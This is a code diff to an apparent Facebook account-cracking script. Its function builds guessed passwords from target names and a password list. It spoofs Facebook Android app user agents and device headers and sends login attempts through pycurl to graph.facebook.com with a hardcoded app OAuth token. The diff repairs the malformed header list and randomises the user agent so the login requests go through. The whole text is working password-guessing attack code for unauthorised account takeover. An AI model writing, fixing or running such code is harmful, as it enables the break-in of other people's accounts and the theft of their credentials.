@@ -1841,7 +1841,7 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
             netheni = str(random.randint(20000, 40000))
             simheni = str(random.randint(20000, 40000))
-            user_agent =  DEF3()
+            user_agent =  f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]"
             warna = random.choice(my_color)
             adid = str(uuid.uuid4())
             device_id = str(uuid.uuid4())
@@ -1871,28 +1871,27 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             'fb_api_req_friendly_name': 'authenticate',
             'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers = [
-            'Host': 'graph.facebook.com',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Priority': 'u=3, i',
-            'X-Fb-Sim-Hni': '45204',
-            'X-Fb-Net-Hni': '45201',
-            'X-Fb-Connection-Quality': 'GOOD',
-            'Zero-Rated': '0',
-            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-Fb-Connection-Bandwidth': '24807555',
-            'X-Fb-Connection-Type': 'MOBILE.LTE',
-            'X-Fb-Device-Group': '5120',
-            'X-Tigon-Is-Retry': 'False',
-            'X-Fb-Friendly-Name': 'authenticate',
-            'X-Fb-Request-Analytics-Tags': 'unknown',
-            'X-Fb-Http-Engine': 'Liger',
-            'X-Fb-Client-Ip': 'True',
-            'X-Fb-Server-Cluster': 'True',
-            'Content-Length': '847'
-            ]
+            'Host: graph.facebook.com',
+            'Content-Type: application/x-www-form-urlencoded',
+            'Accept-Encoding: gzip, deflate',
+            'Connection: keep-alive',
+            'Priority: u=3, i',
+            'X-Fb-Sim-Hni: 45204',
+            'X-Fb-Net-Hni: 45201',
+            'X-Fb-Connection-Quality: GOOD',
+            'Zero-Rated: 0',
+            f'User-Agent: {user_agent}',
+            'Authorization: OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-Fb-Connection-Bandwidth: 24807555',
+            'X-Fb-Connection-Type: MOBILE.LTE',
+            'X-Fb-Device-Group: 5120',
+            'X-Tigon-Is-Retry: False',
+            'X-Fb-Friendly-Name: authenticate',
+            'X-Fb-Request-Analytics-Tags: unknown',
+            'X-Fb-Http-Engine: Liger',
+            'X-Fb-Client-Ip: True',
+            'X-Fb-Server-Cluster: True',
+            'Content-Length: 847']
             url = "https://graph.facebook.com/auth/login"
             buffer = BytesIO()
             c = pycurl.Curl()
